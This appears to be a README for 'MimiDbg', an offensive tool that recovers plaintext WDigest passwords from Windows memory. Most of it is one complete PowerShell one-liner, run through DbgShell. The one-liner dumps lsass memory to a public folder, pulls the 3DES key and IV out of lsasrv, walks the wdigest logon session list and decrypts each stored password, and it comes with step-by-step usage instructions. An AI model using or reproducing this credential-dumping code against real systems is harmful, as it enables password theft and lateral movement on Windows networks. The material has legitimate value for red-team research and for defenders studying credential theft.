# About MimiDbg

MimiDbg is a PowerShell oneliner that leverages the Microsoft tools "DbgShell". DbgShell is a PowerShell front-end for the Windows debugger engine. You can find DbgShell [here](https://github.com/Microsoft/DbgShell)

MimiDbg uses [PowerMemory](https://github.com/giMini/PowerMemory/blob/master/README.md) concept to retrieve Wdigest passwords from the memory.

## How to use it?

![mimiDbg How to use it?](https://media.giphy.com/media/xUOxfdG7ghdVXHmRZ6/giphy.gif)

1) Download the project. 
2) Unzip it in c:\temp. 
3) Open a command prompt. 
4) Type:
```
cd c:\temp\DbgShell\x64
```

5) Run the following oneliner:
```
DbgShell.exe $process = Get-Process lsass;$ok=0;$windowsErrorReporting = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$windowsErrorReportingNativeMethods = $windowsErrorReporting.GetNestedType('NativeMethods', 'NonPublic');$flags = [Reflection.BindingFlags] 'NonPublic, Static';$miniDumpWriteDump = $windowsErrorReportingNativeMethods.GetMethod('MiniDumpWriteDump', $flags);$miniDumpWithFullMemory = [UInt32] 2;$processId = $process.Id;$processName = $process.Name;$processHandle = $process.Handle;$processDumpPath = 'C:\Users\Public\Downloads\juice';$fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create);try{$result = $miniDumpWriteDump.Invoke($null, @($processHandle,$processId,$fileStream.SafeFileHandle,$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));if(!$result) {$fileStream.Close();}$fileStream.Close();$ok=1;}catch{$_.Exception();$fileStream.Close();}Mount-DbgDumpFile -DumpFile $processDumpPath;$faObj = dd lsasrv!h3DesKey;$sa = '{0:x8}' -f $faObj.Item(1) + '{0:x8}' -f $faObj.Item(0);$saObj = dd $sa;$ta = '{0:x8}' -f $saObj.Item(5) + '{0:x8}' -f $saObj.Item(4);$h3Des = db $ta;$k = '0x{0:x}' -f $h3Des.Item(60) + ', 0x{0:x}' -f $h3Des.Item(61) + ', 0x{0:x}' -f $h3Des.Item(62) + ', 0x{0:x}' -f $h3Des.Item(63) + ', 0x{0:x}' -f $h3Des.Item(64) + ', 0x{0:x}' -f $h3Des.Item(65) + ', 0x{0:x}' -f $h3Des.Item(66) + ', 0x{0:x}' -f $h3Des.Item(67) + ', 0x{0:x}' -f $h3Des.Item(68) + ', 0x{0:x}' -f $h3Des.Item(69) + ', 0x{0:x}' -f $h3Des.Item(70) + ', 0x{0:x}' -f $h3Des.Item(71) + ', 0x{0:x}' -f $h3Des.Item(72) + ', 0x{0:x}' -f $h3Des.Item(73) + ', 0x{0:x}' -f $h3Des.Item(74) + ', 0x{0:x}' -f $h3Des.Item(75) + ', 0x{0:x}' -f $h3Des.Item(76) + ', 0x{0:x}' -f $h3Des.Item(77) + ', 0x{0:x}' -f $h3Des.Item(78) + ', 0x{0:x}' -f $h3Des.Item(79) + ', 0x{0:x}' -f $h3Des.Item(80) + ', 0x{0:x}' -f $h3Des.Item(81) + ', 0x{0:x}' -f $h3Des.Item(82) + ', 0x{0:x}' -f $h3Des.Item(83);$iv = db lsasrv!InitializationVector;$iv = '0x{0:x}' -f $iv.Item(0) + ', 0x{0:x}' -f $iv.Item(1) + ', 0x{0:x}' -f $iv.Item(2) + ', 0x{0:x}' -f $iv.Item(3) + ', 0x{0:x}' -f $iv.Item(4) + ', 0x{0:x}' -f $iv.Item(5) + ', 0x{0:x}' -f $iv.Item(6) + ', 0x{0:x}' -f $iv.Item(7);$lsObj = dd wdigest!l_LogSessList;$lsf = '{0:x8}' -f $lsObj.Item(1) + '{0:x8}' -f $lsObj.Item(0);$nextEntry = '';$i = 0;$lsfEntry = $lsf;while ($lsfEntry -ne $nextEntry) {if($i -eq 0) {$lsfObj = dd $lsf;$sizeObj = db $lsf;$nextEntry = '{0:x8}' -f $lsfObj.Item(1) + '{0:x8}' -f $lsfObj.Item(0);$i = 1;}else {$lsfObj = dd $nextEntry;$sizeObj = db $lsf;$nextEntry = '{0:x8}' -f $lsfObj.Item(1) + '{0:x8}' -f $lsfObj.Item(0);}$t = '{0:x8}' -f $lsfObj.Item(15) + '{0:x8}' -f $lsfObj.Item(14);du $t;$sizeObj = db $lsf;$L = '{0:x}' -f $sizeObj.Item(82);$juice = '{0:x8}' -f $lsfObj.Item(23) + '{0:x8}' -f $lsfObj.Item(22);$juiceObj = db $juice L$L;$tot = [System.Convert]::ToInt32($L,16);$phex = '';for($i=0;$i -lt $tot;$i++) {if($i -ne 0) {$phex += ', 0x{0:x2}' -f $juiceObj.Item($i);}else {$phex = '0x{0:x2}' -f $juiceObj.Item($i);}}$password = $phex;$key=$k;$initializationVector=$iv;try{$arrayPassword = $password -split ', ';$passwordByte = @();foreach($ap in $arrayPassword){$passwordByte += [System.Convert]::ToByte($ap,16);}$arrayKey = $key -split ', ';$keyByte = @();foreach($ak in $arrayKey){$keyByte += [System.Convert]::ToByte($ak,16);}$arrayInitializationVector = $initializationVector -split ', ';$initializationVectorByte = @();foreach($aiv in $arrayInitializationVector){$initializationVectorByte += [System.Convert]::ToByte($aiv,16);}$TripleDES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider;$TripleDES.IV = $initializationVectorByte;$TripleDES.Key = $keyByte;$TripleDES.Mode = [System.Security.Cryptography.CipherMode]::CBC;$TripleDES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;$decryptorObject = $TripleDES.CreateDecryptor();[byte[]] $outBlock = $decryptorObject.TransformFinalBlock($passwordByte, 0 , $passwordByte.Length);$TripleDES.Clear();Write-Output ([System.Text.UnicodeEncoding]::Unicode.GetString($outBlock));}catch {Write-Output '$error[0]';}}
```


## Current Status

MimiDbg has been in my mind for a long time (since DbgShell announcement). The project is still pretty new. However, it can demonstrate what can be accomplished.

## Operating System supported

Currently, I tested the oneliner against:

* Windows 2012R2 - 64-bit
* Windows 2016 - 64-bit

## Credential Guard

Look here for more information about [Credential Guard](https://social.technet.microsoft.com/wiki/contents/articles/38015.credential-guard-say-good-bye-to-ptht-pass-the-hashticket-attacks.aspx)